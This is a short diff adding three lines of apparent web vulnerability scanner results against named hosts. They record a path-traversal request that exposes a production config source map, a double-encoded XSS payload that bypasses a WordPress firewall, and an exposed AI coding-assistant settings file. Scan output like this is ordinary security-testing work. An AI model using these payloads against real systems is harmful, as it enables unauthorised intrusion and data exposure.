@@ -1,0 +1,3 @@
+[CVE-2026-39365] [http] [medium] https://kaishuai-dev.allscale.io/node_modules/.vite/deps/../../../config.production.js.map ["/Users/wangkaishuai/allscale/frontend-va-p2/config.production.js"]
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://it-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[claude-settings-exposure] [http] [medium] https://kaishuai-dev.allscale.io/.claude/settings.json
